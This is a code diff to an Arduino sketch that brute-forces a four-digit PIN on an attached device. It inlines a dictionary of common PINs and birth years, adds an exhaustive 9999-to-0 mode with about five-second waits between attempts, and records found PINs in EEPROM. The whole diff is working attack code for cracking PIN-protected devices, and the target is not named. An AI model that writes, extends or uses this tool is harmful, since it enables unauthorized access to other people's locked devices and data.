@@ -5,7 +5,23 @@
 */
 #include <LiquidCrystal.h>
 #include <EEPROM.h>
-#include "dictionary.h"
+short dict[656] =
+{
+	1111,2222,3333,4444,5555,6666,7777,8888,9999,0000,
+	1234,2345,3456,4567,5678,6789,7890,
+	4321,5432,6543,7654,8765,9876,987,
+	1281,2756,8765,
+	1212,1313,1414,1515,1616,1717,1818,1919,1010,
+	2323,2424,2525,2626,2727,2828,2929,
+	3131,3232,3434,3535,3636,3737,3838,
+	1984,1983,1982,1981,1980,1979,1978,1977,1976,1975,1974,1973,1972,1971,1970,
+	1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999,2000,2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2011,2012,2013,2014,2015,2016,2017,2018,2019,2020,2021,2022,2023,2024,2025,
+	-1
+};
+
+
+
+
 const int BUT_START = 6;
 const int BUTTON = 3;
 const int RED = 4;
@@ -49,7 +65,7 @@ void loop() {
 	Serial.println(eeprom_read_short(ptrLastPsw));
 	while (!digitalRead(BUT_START));
 	delay(500);
-	while (digitalRead(BUT_START));
+	//while (digitalRead(BUT_START));
 	lcd.clear();
 	lcd.print("Cheking...");
 	digitalWrite(BUTTON, 1);
@@ -70,6 +86,39 @@ void loop() {
 	lcd.clear();
 	lcd.print("All OK Wait 7sec");
 	delay(7500);
+	if (digitalRead(BUT_START)) {
+		Serial.println("Only BruteForce all pins");
+		lcd.clear();
+		lcd.print("Working... full");
+		for (short i = 9999; i >= 0; --i) {
+			lcd.setCursor(0, 1);
+			if (enterPas(i)) {
+				Serial.print("lastEepromDict");
+				Serial.println(((int)lastEepromDict));
+				if (lastEepromDict < ptrMaxEepromDict) {
+					Serial.println("Writing....");
+					eeprom_write_short(lastEepromDict, i);
+					eeprom_write_short(lastEepromDict + 2, -1);
+				}
+				lcd.clear();
+				lcd.print("Found!!!");
+				lcd.setCursor(0, 1);
+				lcd.print("Passw: ");
+				lcd.print(i);
+				eeprom_write_short(ptrLastPsw, i);//writeLast Password
+				Serial.println("password found! It's");
+				Serial.println(((int)i));
+				while (digitalRead(BUT_START));
+				return;
+			}
+			delay(5100);
+		}
+		lcd.clear();
+		lcd.print("Pasw didn't find");
+		Serial.println("password didn't find");
+		while (digitalRead(BUT_START));
+
+	}
 	for (lastConstDict = 0; dict[lastConstDict] != -1; lastConstDict++);//find last in dict
 	short dataRead = eeprom_read_short(0);
 	Serial.println("Saved pasw");
@@ -85,9 +134,10 @@ void loop() {
 
 
 	Serial.println("Begin BruteForce with dictionary");
-	lcd.clear();
-	lcd.print("Working... dict");
+
 	for (short i = 0; dict[i] != -1; i++) {//BruteForce with dictionary
+		lcd.clear();
+		lcd.print("Working... dict");
 		lcd.setCursor(0, 1);
 		if (enterPas(dict[i])) {
 			Serial.println("password found! In dictionary It's");
